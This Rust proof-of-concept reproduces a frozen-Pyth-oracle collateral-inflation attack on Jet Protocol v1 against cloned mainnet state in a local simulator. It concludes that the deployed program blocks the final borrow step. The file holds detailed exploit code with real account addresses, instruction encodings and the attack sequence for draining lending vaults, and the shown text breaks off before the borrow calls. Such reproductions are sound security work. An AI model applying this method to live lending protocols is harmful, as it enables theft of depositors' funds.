//! Jet Protocol v1 (Solana, program JPv1rCqrhagNNmJVM5J1he7msQ5ybtvE1nNuHpDHMNU)
//! frozen-Pyth-oracle collateral-inflation exploit — reproduction attempt on
//! cloned mainnet state in LiteSVM, and the proof that the deployed program
//! blocks it.
//!
//! The strategy an external, unprivileged attacker would use:
//!   1. buy solETH on the open market (frozen Pyth feed still says $2,304.09/solETH
//!      while the real market price collapsed to ~$298 after the sollet bridge died);
//!   2. deposit ~91.24 solETH into the solETH reserve as collateral;
//!   3. borrow the entire USDC vault (~$16.2k) and the entire SOL vault (~1,274 SOL)
//!      valued at the same frozen oracle prices (~$168k total), staying just inside
//!      the market's 1.25x minimum collateral ratio;
//!   4. never repay.
//!
//! RESULT: steps 1-3 all execute on cloned mainnet state (refresh_reserve is
//! iterative, then obligation creation, deposit and collateral deposit succeed and
//! the oracle-priced collateral is booked), but every `borrow` instruction reverts
//! with an unconditional panic at `src/instructions/borrow.rs:110:5`. The deployed
//! program's last upgrade (slot 160,301,534 = 2022-11-10 12:43:29 UTC) implements
//! jet-v1 commit 66991f4c8f14 "disable borrows" (2022-11-10 05:19:06 UTC), which
//! inserts `panic!("disabled")` as the first statement of the borrow handler at
//! exactly that line. The deployed ELF no longer contains the borrow handler body
//! strings, i.e. the code after the panic was eliminated as unreachable. No debt
//! can be created and no vault funds can be extracted through the borrow path.
//!
//! This binary runs entirely locally against state cloned from mainnet
//! (analysis/accounts.json + analysis/jet_program.so). It NEVER touches the network
//! and NEVER signs anything for a real chain.
//!
//! Outputs (ci-out/): poc_results.json (machine-readable), poc_log.txt (plain text).

use std::{collections::BTreeMap, env, fs, path::PathBuf, str::FromStr};

use base64::Engine as _;
use litesvm::LiteSVM;
use serde::Deserialize;
use serde_json::{json, Value};
use solana_account::Account;
use solana_address::Address;
use solana_clock::Clock;
use solana_instruction::{AccountMeta, Instruction};
use solana_keypair::Keypair;
use solana_signer::Signer;
use solana_transaction::Transaction;

// ---------------------------------------------------------------- constants --

const JET_PROGRAM: &str = "JPv1rCqrhagNNmJVM5J1he7msQ5ybtvE1nNuHpDHMNU";
const TOKEN_PROGRAM: &str = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const SYSTEM_PROGRAM: &str = "11111111111111111111111111111111";
const RENT_SYSVAR: &str = "SysvarRent111111111111111111111111111111111";

const MARKET: &str = "9oiXzad28vLhT2TkFoVRRRcwYKrSF7E3XPUJpwcarCAo";
const MARKET_AUTHORITY: &str = "7gpj9cpzBBW9Ci1yMwWz7iGbQYpm5fZmadNQyrYsqch8";

// Reserves used by the PoC (index 2 = solBTC reserve is irrelevant here).
const RES_USDC: &str = "3ARjV1TvKbQoHAFyQW5P85F7AX5U58Hm2zwTRHGN4v4A"; // index 0
const RES_SOL: &str = "HBD5vNf9a7nnGyfXHEWHZN8Y6bKquB9mSzj6tbcqoXXZ"; // index 1
const RES_SOL_ETH: &str = "2X39AAQzsY7YFLvoLQ5kSd7cJDLn5EEDkgFrFUfqhG1M"; // index 3

// Vaults (SPL token accounts owned by the market authority PDA).
const VAULT_USDC: &str = "63AEVgBicvYeaEwoTr8tkURPnszuB2H1pMBUoNnUPjTN";
const VAULT_SOL: &str = "DvM98WWqFFAeCQi1QJbFREkHetRREqiymHBfaPckdHR3";
const VAULT_SOL_ETH: &str = "FPwT6PEYNJvN2i9Pnz4rD9xS72fgStRdNGXq1kSVGeMH";

// Fee note vaults (refresh_reserve needs one per reserve).
const FEE_USDC: &str = "APU2N1S1qgLpQgpZFTocNuvuL7uNSMVX7X2J1QtAz1sY";
const FEE_SOL: &str = "5VLVVw7g89XY9PVEvsxcMuM6YMuZCjw9ZX1SseV8fsgS";
const FEE_SOL_ETH: &str = "ArUf8kRgWnWu7qVCfQUE5SkEz4eMA5MauYEqsSJo2ApL";

// Deposit note mints (collateral notes) / loan note mints (debt notes).
const NOTE_USDC: &str = "GwbEoYmrmYToCNpEvnhMuVw6hmvRWn6QBFYJCwGfEDAT";
const NOTE_SOL: &str = "2YuVnXkSmW714ziXkfPfmvAnniBc1tHiAB7gYgRpx43a";
const NOTE_SOL_ETH: &str = "65zGnhqrsqFKABMupVjU9FXVJLFzzH9aXGyVjnAzdB8A";
const LOAN_USDC: &str = "G17Yu6f4emBeRLWS1Y4cNJMTmT5LUGJH95zK6253KoAH";
const LOAN_SOL: &str = "A9S9XVCuNXHnJGFhxBhsTmJNHa6aPccF5NCAGgE4BxGF";

// Pyth (v1) price accounts — frozen since early 2024.
const PYTH_USDC: &str = "Gnt27xtC473ZT2Mw5u8wZ68Z3gULkSTb5DuxJy7eJotD";
const PYTH_SOL: &str = "H6ARHf6YXhGYeQfUzQNGk6rDNnLBQKrenN712K4AQJEG";
const PYTH_SOL_ETH: &str = "JBu1AL4obBcCMqKBBxhpWCNUt136ijcuMZLFvTP7iWdB";

// Underlying token mints.
const MINT_USDC: &str = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
const MINT_WSOL: &str = "So11111111111111111111111111111111111111112";
const MINT_SOL_ETH: &str = "2FPyTwcZLUg1MDrwsyoP4D6s1tM7hAkHYRjkNb5w6Pxk";

// Anchor discriminators (sha256("global:<snake_case>")[..8]) — all re-verified.
const D_REFRESH_RESERVE: &str = "02da8aeb4fc91966";
const D_INIT_OBLIGATION: &str = "fb0ae74c1b0b9f60";
const D_INIT_DEPOSIT_ACCOUNT: &str = "884fcaced392b69e";
const D_DEPOSIT: &str = "f223c68952e1f2b6";
const D_INIT_COLLATERAL_ACCOUNT: &str = "ff91b62cf6d5a038";
const D_DEPOSIT_COLLATERAL: &str = "9c838e7492f7a278";
const D_INIT_LOAN_ACCOUNT: &str = "c266a6825b4abc51";
const D_BORROW: &str = "e4fd83cacf745912";

// Clock: slot of the state dump (456,071,544) and a timestamp just above the
// reserves' accrued_until (1,790,518,679) so interest accrual can run.
const CLOCK_SLOT: u64 = 456_071_544;
const CLOCK_TS: i64 = 1_791_813_122;

// The solETH collateral deposit: 91.24 tokens at 6 decimals. Chosen so the
// oracle-priced collateral (91.24 * $2,304.0875 = $210,224.94) divided by the
// 1.25x min collateral ratio ($168,179.95) just covers both vaults
// ($16,246.54 + 1,274.172220813 * $119.23378 = $168,170.9).
const DEPOSIT_SOL_ETH_RAW: u64 = 91_240_000;
const ATTACKER_SOL_ETH_RAW: u64 = 100_000_000; // 100 solETH (bought externally)

// Full-vault borrow targets (read from the cloned accounts at run time too).
const BORROW_USDC_FULL: u64 = 16_246_540_570;
const BORROW_SOL_FULL: u64 = 1_274_172_220_813;

// Oracle prices (frozen Pyth feed values, USD).
const PRICE_USDC: f64 = 1.0;
const PRICE_SOL: f64 = 119.23378;
const PRICE_SOL_ETH: f64 = 2_304.087_500_74;
// Real-world (non-oracle) solETH price used only to frame cost, per parent brief.
#[allow(dead_code)]
const REAL_SOL_ETH_USD: f64 = 298.0;
// Real-world SOL price assumption used only for the USD framing of the net.
#[allow(dead_code)]
const REAL_SOL_USD: f64 = 108.0;

// ------------------------------------------------------------- instruction enc --

fn pk(s: &str) -> Address {
    Address::from_str(s).expect("valid base58 address")
}

fn hex_val(b: u8) -> u8 {
    match b {
        b'0'..=b'9' => b - b'0',
        b'a'..=b'f' => b - b'a' + 10,
        b'A'..=b'F' => b - b'A' + 10,
        _ => panic!("bad hex"),
    }
}

fn disc8(h: &str) -> [u8; 8] {
    let b = h.as_bytes();
    assert_eq!(b.len(), 16, "discriminator must be 8 bytes hex");
    let mut out = [0u8; 8];
    for i in 0..8 {
        out[i] = (hex_val(b[2 * i]) << 4) | hex_val(b[2 * i + 1]);
    }
    out
}

/// Instruction data for `ix(disc, args)`.
fn data(disc: &str, args: &[u8]) -> Vec<u8> {
    let mut d = disc8(disc).to_vec();
    d.extend_from_slice(args);
    d
}

/// Anchor `Amount` (Borsh struct { units: enum u8, value: u64 }).
fn amount(units_tag: u8, value: u64) -> Vec<u8> {
    let mut v = vec![units_tag];
    v.extend_from_slice(&value.to_le_bytes());
    v
}

// -------------------------------------------------------------- cfg helpers --

#[derive(Clone, Debug)]
#[allow(dead_code)]
struct Reserve {
    idx: u16,
    reserve: Address,
    vault: Address,
    fee_vault: Address,
    note_mint: Address,
    loan_mint: Address,
    pyth: Address,
    mint: Address,
    name: &'static str,
}

fn reserves() -> [Reserve; 3] {
    [
        Reserve {
            idx: 0,
            reserve: pk(RES_USDC),
            vault: pk(VAULT_USDC),
            fee_vault: pk(FEE_USDC),
            note_mint: pk(NOTE_USDC),
            loan_mint: pk(LOAN_USDC),
            pyth: pk(PYTH_USDC),
            mint: pk(MINT_USDC),
            name: "USDC",
        },
        Reserve {
            idx: 1,
            reserve: pk(RES_SOL),
            vault: pk(VAULT_SOL),
            fee_vault: pk(FEE_SOL),
            note_mint: pk(NOTE_SOL),
            loan_mint: pk(LOAN_SOL),
            pyth: pk(PYTH_SOL),
            mint: pk(MINT_WSOL),
            name: "SOL",
        },
        Reserve {
            idx: 3,
            reserve: pk(RES_SOL_ETH),
            vault: pk(VAULT_SOL_ETH),
            fee_vault: pk(FEE_SOL_ETH),
            note_mint: pk(NOTE_SOL_ETH),
            loan_mint: pk("5v8QVtwqZjSdJxhCF2xWrAopiyhDgJTdgeQZ5aWmStnE"),
            pyth: pk(PYTH_SOL_ETH),
            mint: pk(MINT_SOL_ETH),
            name: "solETH",
        },
    ]
}

// Instruction builders. Account metas replicate the deployed program's
// `ToAccountMetas` (verified against jet-proto-v1-cpi 0.23.0, same discriminators,
// and against the on-chain IDL v0.2.0).

fn ix_refresh(r: &Reserve) -> Instruction {
    Instruction {
        program_id: pk(JET_PROGRAM),
        accounts: vec![
            AccountMeta::new(pk(MARKET), false),
            AccountMeta::new_readonly(pk(MARKET_AUTHORITY), false),
            AccountMeta::new(r.reserve, false),
            AccountMeta::new(r.fee_vault, false),
            AccountMeta::new(r.note_mint, false),
            AccountMeta::new_readonly(r.pyth, false),
            AccountMeta::new_readonly(pk(TOKEN_PROGRAM), false),
        ],
        data: data(D_REFRESH_RESERVE, &[]),
    }
}

fn ix_init_obligation(obligation: Address, borrower: Address, bump: u8) -> Instruction {
    Instruction {
        program_id: pk(JET_PROGRAM),
        accounts: vec![
            AccountMeta::new_readonly(pk(MARKET), false),
            AccountMeta::new_readonly(pk(MARKET_AUTHORITY), false),
            AccountMeta::new(borrower, true),
            AccountMeta::new(obligation, false),
            AccountMeta::new_readonly(pk(TOKEN_PROGRAM), false),
            AccountMeta::new_readonly(pk(SYSTEM_PROGRAM), false),
        ],
        data: data(D_INIT_OBLIGATION, &[bump]),
    }
}

fn ix_init_deposit_account(r: &Reserve, depositor: Address, account: Address, bump: u8) -> Instruction {
    Instruction {
        program_id: pk(JET_PROGRAM),
        accounts: vec![
            AccountMeta::new_readonly(pk(MARKET), false),
            AccountMeta::new_readonly(pk(MARKET_AUTHORITY), false),
            AccountMeta::new_readonly(r.reserve, false),
            AccountMeta::new_readonly(r.note_mint, false),
            AccountMeta::new(depositor, true),
            AccountMeta::new(account, false),
            AccountMeta::new_readonly(pk(TOKEN_PROGRAM), false),
            AccountMeta::new_readonly(pk(SYSTEM_PROGRAM), false),
            AccountMeta::new_readonly(pk(RENT_SYSVAR), false),
        ],
        data: data(D_INIT_DEPOSIT_ACCOUNT, &[bump]),
    }
}

fn ix_deposit(r: &Reserve, depositor: Address, account: Address, source: Address, bump: u8, amt: u64) -> Instruction {
    Instruction {
        program_id: pk(JET_PROGRAM),
        accounts: vec![
            AccountMeta::new_readonly(pk(MARKET), false),
            AccountMeta::new_readonly(pk(MARKET_AUTHORITY), false),
            AccountMeta::new(r.reserve, false),
            AccountMeta::new(r.vault, false),
            AccountMeta::new(r.note_mint, false),
            AccountMeta::new_readonly(depositor, true),
            AccountMeta::new(account, false),
            AccountMeta::new(source, false),
            AccountMeta::new_readonly(pk(TOKEN_PROGRAM), false),
        ],
        data: data(D_DEPOSIT, &{
            let mut a = vec![bump];
            a.extend(amount(0, amt)); // 0 = Tokens
            a
        }),
    }
}

fn ix_init_collateral_account(r: &Reserve, obligation: Address, owner: Address, account: Address, bump: u8) -> Instruction {
    Instruction {
        program_id: pk(JET_PROGRAM),
        accounts: vec![
            AccountMeta::new_readonly(pk(MARKET), false),
            AccountMeta::new_readonly(pk(MARKET_AUTHORITY), false),
            AccountMeta::new(obligation, false),
            AccountMeta::new_readonly(r.reserve, false),
            AccountMeta::new_readonly(r.note_mint, false),
            AccountMeta::new(owner, true),
            AccountMeta::new(account, false),
            AccountMeta::new_readonly(pk(TOKEN_PROGRAM), false),
            AccountMeta::new_readonly(pk(SYSTEM_PROGRAM), false),
            AccountMeta::new_readonly(pk(RENT_SYSVAR), false),
        ],
        data: data(D_INIT_COLLATERAL_ACCOUNT, &[bump]),
    }
}

fn ix_deposit_collateral(
    r: &Reserve,
    obligation: Address,
    owner: Address,
    deposit_account: Address,
    collateral_account: Address,
    collateral_bump: u8,
    deposit_bump: u8,
    notes: u64,
) -> Instruction {
    Instruction {
        program_id: pk(JET_PROGRAM),
        accounts: vec![
            AccountMeta::new_readonly(pk(MARKET), false),
            AccountMeta::new_readonly(pk(MARKET_AUTHORITY), false),
            AccountMeta::new_readonly(r.reserve, false),
            AccountMeta::new(obligation, false),
            AccountMeta::new_readonly(owner, true),
            AccountMeta::new(deposit_account, false),
            AccountMeta::new(collateral_account, false),
            AccountMeta::new_readonly(pk(TOKEN_PROGRAM), false),
        ],
        data: data(D_DEPOSIT_COLLATERAL, &{
            let mut a = vec![collateral_bump, deposit_bump];
            a.extend(amount(1, notes)); // 1 = DepositNotes
            a
        }),
    }
}

fn ix_init_loan_account(r: &Reserve, obligation: Address, owner: Address, account: Address, bump: u8) -> Instruction {
    Instruction {
        program_id: pk(JET_PROGRAM),
        accounts: vec![
            AccountMeta::new_readonly(pk(MARKET), false),
            AccountMeta::new_readonly(pk(MARKET_AUTHORITY), false),
            AccountMeta::new(obligation, false),
            AccountMeta::new_readonly(r.reserve, false),
            AccountMeta::new_readonly(r.loan_mint, false),
            AccountMeta::new(owner, true),
            AccountMeta::new(account, false),
            AccountMeta::new_readonly(pk(TOKEN_PROGRAM), false),
            AccountMeta::new_readonly(pk(SYSTEM_PROGRAM), false),
            AccountMeta::new_readonly(pk(RENT_SYSVAR), false),
        ],
        data: data(D_INIT_LOAN_ACCOUNT, &[bump]),
    }
}

fn ix_borrow(r: &Reserve, obligation: Address, borrower: Address, loan_account: Address, receiver: Address, bump: u8, amt: u64) -> Instruction {
    Instruction {
        program_id: pk(JET_PROGRAM),
        accounts: vec![
            AccountMeta::new_readonly(pk(MARKET), false),
            AccountMeta::new_readonly(pk(MARKET_AUTHORITY), false),
            AccountMeta::new(obligation, false),
            AccountMeta::new(r.reserve, false),
            AccountMeta::new(r.vault, false),
            AccountMeta::new(r.loan_mint, false),
            AccountMeta::new_readonly(borrower, true),
            AccountMeta::new(loan_account, false),
            AccountMeta::new(receiver, false),
            AccountMeta::new_readonly(pk(TOKEN_PROGRAM), false),
        ],
        data: data(D_BORROW, &{
            let mut a = vec![bump];
            a.extend(amount(0, amt)); // 0 = Tokens
            a
        }),
    }
}

// ------------------------------------------------------------------ accounts --

#[derive(Debug, Deserialize)]
#[allow(dead_code)]
struct AccountsFile {
    slot: u64,
    #[serde(default)]
    rpc: Option<String>,
    accounts: BTreeMap<String, AccountEntry>,
}

#[derive(Debug, Deserialize)]
#[allow(dead_code)]
struct AccountEntry {
    lamports: u64,
    owner: String,
    executable: bool,
    #[serde(default)]
    space: u64,
    data_b64: String,
}

fn token_account_bytes(mint: &Address, owner: &Address, amount: u64) -> Vec<u8> {
    // SPL Token v1 Account: mint(32) owner(32) amount(8) delegate COption(36)
    // state(1) is_native COption(12) delegated_amount(8) close_authority COption(36).
    let mut d = vec![0u8; 165];
    d[0..32].copy_from_slice(mint.as_ref());
    d[32..64].copy_from_slice(owner.as_ref());
    d[64..72].copy_from_slice(&amount.to_le_bytes());
    d[108] = 1; // AccountState::Initialized
    d
}

fn token_amount(svm: &LiteSVM, addr: &Address) -> Option<u64> {
    let acc = svm.get_account(addr)?;
    if acc.data.len() != 165 {
        return None;
    }
    Some(u64::from_le_bytes(acc.data[64..72].try_into().unwrap()))
}

/// Reads (invalidated, last_updated_slot) for a reserve in the market cache.
fn market_cache_state(svm: &LiteSVM, idx: usize) -> Option<(u8, u64)> {
    let acc = svm.get_account(&pk(MARKET))?;
    let m = &acc.data[8..];
    let c = 512 + idx * 384 + 112;
    Some((
        m[c + 264],
        u64::from_le_bytes(m[c + 256..c + 264].try_into().unwrap()),
    ))
}

fn u192_f64(b: &[u8], off: usize) -> f64 {
    let lo = u64::from_le_bytes(b[off..off + 8].try_into().unwrap()) as f64;
    let mid = u64::from_le_bytes(b[off + 8..off + 16].try_into().unwrap()) as f64;
    let hi = u64::from_le_bytes(b[off + 16..off + 24].try_into().unwrap()) as f64;
    (lo + mid * 18446744073709551616.0 + hi * 340282366920938463463374607431768211456.0) / 1e15
}

/// Reads the market account's cached reserve prices (after refresh_reserve).
fn market_cache(svm: &LiteSVM) -> Value {
    let Some(acc) = svm.get_account(&pk(MARKET)) else {
        return json!({});
    };
    let m = &acc.data[8..];
    let flags = u64::from_le_bytes(m[152..160].try_into().unwrap());
    let mut out = serde_json::Map::new();
    out.insert("flags".into(), json!(flags));
    for (idx, name) in [(0usize, "USDC"), (1, "SOL"), (2, "solBTC"), (3, "solETH")] {
        let base = 512 + idx * 384;
        if m[base..base + 32].iter().all(|b| *b == 0) {
            continue;
        }
        let c = base + 112;
        let entry = json!({
            "price": u192_f64(m, c),
            "deposit_note_exchange_rate": u192_f64(m, c + 24),
            "loan_note_exchange_rate": u192_f64(m, c + 48),
            "min_collateral_ratio": u192_f64(m, c + 72),
            "liquidation_bonus_bps": u16::from_le_bytes(m[c + 96..c + 98].try_into().unwrap()),
            "last_updated_slot": u64::from_le_bytes(m[c + 256..c + 264].try_into().unwrap()),
            "invalidated": m[c + 264],
        });
        out.insert(name.to_string(), entry);
    }
    Value::Object(out)
}

/// The deployed `refresh_reserve` accrues interest in bounded chunks of
/// MAX_ACCRUAL_SECONDS = 1 week (`try_accrue_interest`): every call that does not
/// fully catch up marks the market cache entry `invalidated` ("performing partial
/// reserve refresh: additional iterations required") and borrow/deposit_collateral
/// panic on such a cache. The reserves here are ~15 days behind, so each reserve
/// needs 3 calls. This loops until the cache is valid at the current slot.
fn refresh_until_full(ctx: &mut Ctx, svm: &mut LiteSVM, payer: &Keypair, r: &Reserve) -> bool {
    for i in 1..=12u32 {
        if let Some((0, slot)) = market_cache_state(svm, r.idx as usize) {
            if slot == CLOCK_SLOT {
                ctx.log(format!(" reserve {} cache is fully refreshed (slot {slot})", r.name));
                return true;
            }
        }
        let extra = match market_cache_state(svm, r.idx as usize) {
            Some((inv, slot)) => json!({"invalidated_before": inv, "last_updated_before": slot}),
            None => json!({}),
        };
        if !ctx.send(
            svm,
            payer,
            &[ix_refresh(r)],
            &format!("refresh_reserve({}) iter {}", r.name, i),
            extra,
        ) {
            return false;
        }
    }
    ctx.log(format!(" reserve {} cache did not reach Full within 12 iterations", r.name));
    false
}

struct Ctx {
    steps: Vec<Value>,
    lines: Vec<String>,
    pre: Value,
}

impl Ctx {
    fn new() -> Self {
        Self { steps: Vec::new(), lines: Vec::new(), pre: Value::Null }
    }

    fn log(&mut self, s: impl AsRef<str>) {
        let s = s.as_ref().to_string();
        println!("{s}");
        self.lines.push(s);
    }

    fn note_step(&mut self, label: &str, ok: bool, err: Option<String>, logs_tail: Vec<String>, cu: u64, extra: Value) {
        let mut v = json!({
            "step": label,
            "ok": ok,
            "cu": cu,
            "logs_tail": logs_tail,
        });
        if let Some(e) = err {
            v["err"] = json!(e);
        }
        if let Value::Object(m) = extra {
            for (k, val) in m {
                v[k.as_str()] = val;
            }
        }
        self.steps.push(v);
    }

    /// Sends one transaction (all of its instructions). Returns true on success.
    fn send(&mut self, svm: &mut LiteSVM, payer: &Keypair, ixs: &[Instruction], label: &str, extra: Value) -> bool {
        let blockhash = svm.latest_blockhash();
        let tx = Transaction::new_signed_with_payer(ixs, Some(&payer.pubkey()), &[payer], blockhash);
        match svm.send_transaction(tx) {
            Ok(meta) => {
                let tail: Vec<String> = meta.logs.iter().rev().take(10).rev().cloned().collect();
                self.log(format!(
                    "[ OK ] {label}  (ixs={} cu={} logs={})",
                    ixs.len(),
                    meta.compute_units_consumed,
                    meta.logs.len()
                ));
                self.note_step(label, true, None, tail, meta.compute_units_consumed, extra);
                true
            }
            Err(e) => {
                self.log(format!("[FAIL] {label}  err={:?}", e.err));
                for l in e.meta.logs.iter().rev().take(25).rev() {
                    self.log(format!("        | {l}"));
                }
                self.note_step(
                    label,
                    false,
                    Some(format!("{:?}", e.err)),
                    e.meta.logs.iter().rev().take(25).rev().cloned().collect(),
                    e.meta.compute_units_consumed,
                    extra,
                );
                false
            }
        }
    }
}

// ---------------------------------------------------------------------- main --

fn main() {
    let mut ctx = Ctx::new();

    let out_dir: PathBuf = env::var("JET_OUT_DIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("../ci-out"));
    fs::create_dir_all(&out_dir).ok();

    let state: AccountsFile =
        serde_json::from_slice(include_bytes!("../../analysis/accounts.json")).expect("accounts.json");
    let program_bytes: &[u8] = include_bytes!("../../analysis/jet_program.so");

    ctx.log("===================================================================");
    ctx.log(" Jet v1 (Solana) frozen-oracle PoC — LiteSVM, cloned mainnet state");
    ctx.log(format!(" accounts.json dump slot = {}", state.slot));
    ctx.log(format!(" clock set to slot={CLOCK_SLOT} unix_timestamp={CLOCK_TS}"));
    ctx.log(" no network, no real-chain transactions");
    ctx.log("===================================================================");

    let mut svm = LiteSVM::new()
        // The PoC deliberately re-sends byte-identical refresh transactions (same clock
        // slot, same blockhash) while iterating `refresh_reserve`; disable the duplicate
        // signature history so LiteSVM does not reject them as AlreadyProcessed.
        .with_transaction_history(0);

    // Clock: must be >= dump slot and > reserve.accrued_until.
    let mut clock = svm.get_sysvar::<Clock>();
    clock.slot = CLOCK_SLOT;
    clock.unix_timestamp = CLOCK_TS;
    clock.epoch = CLOCK_SLOT / 432_000;
    svm.set_sysvar::<Clock>(&clock);

    // Load every cloned account except programs/sysvars (LiteSVM provides those).
    let mut loaded = 0usize;
    for (k, v) in &state.accounts {
        let key = k.as_str();
        if key == JET_PROGRAM || key == TOKEN_PROGRAM {
            continue; // jet via add_program, spl-token preloaded
        }
        if key.starts_with("Sysvar") || key == SYSTEM_PROGRAM {
            continue; // sysvars/builtins preloaded
        }
        if v.executable {
            continue;
        }
        let addr = pk(k);
        let data = base64::engine::general_purpose::STANDARD
            .decode(&v.data_b64)
            .expect("base64");
        svm.set_account(
            addr,
            Account {
                lamports: v.lamports,
                data,
                owner: pk(&v.owner),
                executable: false,
                rent_epoch: 0,
            },
        )
        .unwrap_or_else(|e| panic!("set_account {k}: {e:?}"));
        loaded += 1;
    }
    svm.add_program(pk(JET_PROGRAM), program_bytes)
        .expect("add_program jet");
    ctx.log(format!(" loaded {loaded} accounts from accounts.json + jet program ELF"));

    // Attacker identity + 10 SOL for fees/rent.
    let attacker = Keypair::new();
    let attacker_pk = attacker.pubkey();
    svm.airdrop(&attacker_pk, 10_000_000_000).expect("airdrop");
    ctx.log(format!(" attacker = {attacker_pk} (airdrop 10 SOL)"));

    // Fabricate attacker token accounts: 100 solETH to spend, empty USDC & WSOL receivers.
    let atk_sol_eth = Keypair::new().pubkey();
    let atk_usdc = Keypair::new().pubkey();
    let atk_wsol = Keypair::new().pubkey();
    let rent165 = svm.minimum_balance_for_rent_exemption(165);
    for (addr, mint, amount, name) in [
        (atk_sol_eth, pk(MINT_SOL_ETH), ATTACKER_SOL_ETH_RAW, "solETH"),
        (atk_usdc, pk(MINT_USDC), 0, "USDC"),
        (atk_wsol, pk(MINT_WSOL), 0, "WSOL"),
    ] {
        svm.set_account(
            addr,
            Account {
                lamports: rent165,
                data: token_account_bytes(&mint, &attacker_pk, amount),
                owner: pk(TOKEN_PROGRAM),
                executable: false,
                rent_epoch: 0,
            },
        )
        .unwrap();
        ctx.log(format!(" fabricated attacker {name} account {addr} amount_raw={amount}"));
    }

    // PDAs. Seeds verified against 1,200 live obligations + 2,132 live positions.
    let (obligation, obligation_bump) = Address::find_program_address(
        &[b"obligation", pk(MARKET).as_ref(), attacker_pk.as_ref()],
        &pk(JET_PROGRAM),
    );
    let (deposit_account, deposit_bump) = Address::find_program_address(
        &[b"deposits", pk(RES_SOL_ETH).as_ref(), attacker_pk.as_ref()],
        &pk(JET_PROGRAM),
    );
    let (collateral_account, collateral_bump) = Address::find_program_address(
        &[b"collateral", pk(RES_SOL_ETH).as_ref(), obligation.as_ref(), attacker_pk.as_ref()],
        &pk(JET_PROGRAM),
    );
    let (loan_usdc, loan_usdc_bump) = Address::find_program_address(
        &[b"loan", pk(RES_USDC).as_ref(), obligation.as_ref(), attacker_pk.as_ref()],
        &pk(JET_PROGRAM),
    );
    let (loan_sol, loan_sol_bump) = Address::find_program_address(
        &[b"loan", pk(RES_SOL).as_ref(), obligation.as_ref(), attacker_pk.as_ref()],
        &pk(JET_PROGRAM),
    );
    ctx.log(format!(" obligation={obligation} bump={obligation_bump}"));
    ctx.log(format!(" solETH deposit={deposit_account} bump={deposit_bump}"));
    ctx.log(format!(" solETH collateral={collateral_account} bump={collateral_bump}"));
    ctx.log(format!(" USDC loan={loan_usdc} bump={loan_usdc_bump}"));
    ctx.log(format!(" SOL loan={loan_sol} bump={loan_sol_bump}"));

    let [usdc, sol, sol_eth] = reserves();

    // Pre-state (from the sim, right after cloning).
    let pre = json!({
        "market": market_cache(&svm),
        "vault_usdc_raw": token_amount(&svm, &usdc.vault),
        "vault_sol_raw": token_amount(&svm, &sol.vault),
        "vault_sol_eth_raw": token_amount(&svm, &sol_eth.vault),
    });
    ctx.pre = pre.clone();
    ctx.log(format!(" pre-state market cache / vaults: {}", pre));

    // ============================ Step 1: refresh all three reserves ======
    let ok = ctx.send(
        &mut svm,
        &attacker,
        &[ix_refresh(&sol_eth), ix_refresh(&usdc), ix_refresh(&sol)],
        "refresh_reserve(solETH,USDC,SOL)",
        json!({}),
    );
    if !ok {
        ctx.log(" refresh failed — cannot proceed; oracle accounts may be invalid for this program");
        finalize(&ctx, &out_dir, &svm, json!({}), "fail_refresh");
        return;
    }
    ctx.log(format!(" market cache after refresh: {}", market_cache(&svm)));

    // refresh_reserve accrues at most one week of interest per call; the reserves
    // are ~15 days behind accrued_until, so each needs multiple calls to become
    // usable (every Partial call leaves the cache `invalidated`).
    for r in [&sol_eth, &usdc, &sol] {
        if !refresh_until_full(&mut ctx, &mut svm, &attacker, r) {
            finalize(&ctx, &out_dir, &svm, json!({}), "fail_refresh_full");
            return;
        }
    }

    // ============================ Step 2: init obligation ================
    if !ctx.send(
        &mut svm,
        &attacker,
        &[ix_init_obligation(obligation, attacker_pk, obligation_bump)],
        "init_obligation",
        json!({}),
    ) {
        finalize(&ctx, &out_dir, &svm, json!({}), "fail_init_obligation");
        return;
    }

    // ============================ Step 3: init solETH deposit account ====
    let ixs = vec![
        ix_refresh(&sol_eth),
        ix_init_deposit_account(&sol_eth, attacker_pk, deposit_account, deposit_bump),
    ];
    if !ctx.send(&mut svm, &attacker, &ixs, "init_deposit_account(solETH)", json!({})) {
        finalize(&ctx, &out_dir, &svm, json!({}), "fail_init_deposit");
        return;
    }

    // ============================ Step 4: deposit 91.24 solETH ===========
    let ixs = vec![
        ix_refresh(&sol_eth),
        ix_deposit(&sol_eth, attacker_pk, deposit_account, atk_sol_eth, deposit_bump, DEPOSIT_SOL_ETH_RAW),
    ];
    if !ctx.send(&mut svm, &attacker, &ixs, "deposit(91.24 solETH)", json!({"amount_raw": DEPOSIT_SOL_ETH_RAW})) {
        finalize(&ctx, &out_dir, &svm, json!({}), "fail_deposit");
        return;
    }
    let notes = token_amount(&svm, &deposit_account).unwrap_or(0);
    ctx.log(format!(" deposit account notes after deposit = {notes} raw (solETH notes, 6dp)"));
    if notes == 0 {
        ctx.log(" no deposit notes were minted — aborting");
        finalize(&ctx, &out_dir, &svm, json!({}), "fail_no_notes");
        return;
    }

    // ============================ Step 5: init collateral account ========
    let ixs = vec![
        ix_refresh(&sol_eth),
        ix_init_collateral_account(&sol_eth, obligation, attacker_pk, collateral_account, collateral_bump),
    ];
    if !ctx.send(&mut svm, &attacker, &ixs, "init_collateral_account(solETH)", json!({})) {
        finalize(&ctx, &out_dir, &svm, json!({}), "fail_init_collateral");
        return;
    }

    // ============================ Step 6: move ALL notes to collateral ===
    let ixs = vec![
        ix_refresh(&sol_eth),
        ix_deposit_collateral(
            &sol_eth,
            obligation,
            attacker_pk,
            deposit_account,
            collateral_account,
            collateral_bump,
            deposit_bump,
            notes,
        ),
    ];
    if !ctx.send(
        &mut svm,
        &attacker,
        &ixs,
        "deposit_collateral(all notes)",
        json!({"notes_raw": notes}),
    ) {
        finalize(&ctx, &out_dir, &svm, json!({}), "fail_deposit_collateral");
        return;
    }
    let coll_notes = token_amount(&svm, &collateral_account).unwrap_or(0);
    ctx.log(format!(" collateral account notes = {coll_notes} raw"));

    // ============================ Step 7/8: loan accounts ================
    let ixs = vec![ix_refresh(&usdc), ix_init_loan_account(&usdc, obligation, attacker_pk, loan_usdc, loan_usdc_bump)];
    if !ctx.send(&mut svm, &attacker, &ixs, "init_loan_account(USDC)", json!({})) {
        finalize(&ctx, &out_dir, &svm, json!({}), "fail_init_loan_usdc");
        return;
    }
    let ixs = vec![ix_refresh(&sol), ix_init_loan_account(&sol, obligation, attacker_pk, loan_sol, loan_sol_bump)];
